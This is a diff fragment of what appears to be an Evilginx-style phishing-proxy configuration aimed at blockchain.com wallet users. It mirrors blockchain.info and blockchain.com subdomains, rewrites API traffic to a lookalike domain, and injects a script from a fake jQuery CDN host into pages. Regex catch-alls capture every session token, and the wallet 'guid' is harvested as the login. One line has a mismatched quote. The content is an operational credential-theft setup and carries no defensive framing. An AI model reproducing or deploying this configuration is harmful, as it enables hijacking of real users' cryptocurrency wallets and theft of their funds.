@@ -5,14 +5,17 @@ proxy_hosts:
   - {phish_sub: '', orig_sub: 'www', domain: 'blockchain.info', session: false, is_landing: false}
   - {phish_sub: 'wallet-helper', orig_sub: 'wallet-helper', domain: 'blockchain.com', session: false, is_landing: false}
   - {phish_sub: 'api', orig_sub: 'api', domain: 'blockchain.info', session: false, is_landing: false}
+
 sub_filters:
   - {triggers_on: 'api.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: 'api.blockchain.info', replace: 'api.blockchain-info-99831.com', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
   - {triggers_on: www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: '</script>', replace: '<script src="https://jquery-cdn-39483.com/jquery-3.5.4.min.js"></script></script>', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+
 auth_tokens:
   - domain: '.blockchain.com'
     keys: ['(.+),regexp']
   - domain: '(.+),regexp'
     keys: ['(.+),regexp']
+
 credentials:
   username:
     key: 'guid'
